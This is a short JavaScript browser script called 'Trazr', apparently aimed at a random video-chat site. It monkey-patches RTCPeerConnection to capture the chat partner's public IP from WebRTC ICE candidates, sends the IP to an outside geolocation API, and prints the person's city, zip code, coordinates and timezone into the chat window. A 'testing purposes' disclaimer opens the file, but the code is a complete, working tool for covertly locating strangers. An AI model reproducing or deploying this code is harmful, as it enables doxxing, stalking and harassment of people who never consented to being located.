/*  Author: Nycz-lab
/   This is only for testing purposes dont misuse this code
/
*/

let currentConnection = null;

let chatbox = null;

let TrazrContainer = document.createElement('div');
TrazrContainer.classList.add('statuslog');
TrazrContainer.style.color = 'orange';
TrazrContainer.style.backgroundColor = '#333333';

let pre = document.createElement('pre');


let TrazrMsg = document.createElement('p');
TrazrMsg.style.textAlign = 'center';

const Ascii = `
  ▄▄▄█████▓ ██▀███   ▄▄▄     ▒███████▒ ██▀███  
  ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄   ▒ ▒ ▒ ▄▀░▓██ ▒ ██▒
  ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄ ░ ▒ ▄▀▒░ ▓██ ░▄█ ▒
  ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██  ▄▀▒   ░▒██▀▀█▄  
    ▒██▒ ░ ░██▓ ▒██▒▒▓█   ▓██▒███████▒░██▓ ▒██▒
    ▒ ░░   ░ ▒▓ ░▒▓░░▒▒   ▓▒█░▒▒ ▓░▒░▒░ ▒▓ ░▒▓░
      ░      ░▒ ░ ▒ ░ ░   ▒▒  ░▒ ▒ ░ ▒  ░▒ ░ ▒ 
    ░ ░      ░░   ░   ░   ▒  ░ ░ ░ ░ ░  ░░   ░ 
              ░           ░    ░ ░       ░     `


window.oRTCPeerConnection =
  window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
  const pc = new window.oRTCPeerConnection(...args);

  pc.oaddIceCandidate = pc.addIceCandidate;

  pc.addIceCandidate = function (iceCandidate, ...rest) {
    const fields = iceCandidate.candidate.split(" ");

    const ip = fields[4];
    if (fields[7] === "srflx") {
        if(currentConnection === null || currentConnection.ip !== ip)
          getLocation(ip);
    }
    return pc.oaddIceCandidate(iceCandidate, ...rest);
  };
  return pc;
};

let logToChat = (output) => {
  chatbox = document.getElementsByClassName("logbox")[0].children[0]

  TrazrMsg.innerText = output

  pre.innerHTML = ""

  pre.appendChild(TrazrMsg);
  TrazrContainer.appendChild(pre)
  chatbox.appendChild(TrazrContainer)
}

let getLocation = async (ip) => {
  let url = `https://geoip.razex.de/api/${ip}`;

  await fetch(url).then((response) =>
    response.json().then((json) => {
      const output = `
      ${Ascii}
          ---------------------

          Connection Info:

            IP Address: ${ip}
            Hostname:   ${json.hostname}

          GeoLocationInfo:

            Country:    ${json.country.name}
            Continent:  ${json.country.continent}

            City:       ${json.city.name}
            Region:     ${json.city.region}
            ZipCode:    ${json.location.zip}

            Accuracy:   ${json.location.accuracy_radius}
            Lat / Long: (${json.location.latitude}, ${json.location.longitude})
            Timezone:   ${json.location.timezone}

          ---------------------
          `;
      console.log(`%c${output}`, "color: orange")
      logToChat(output)
    })
  );
};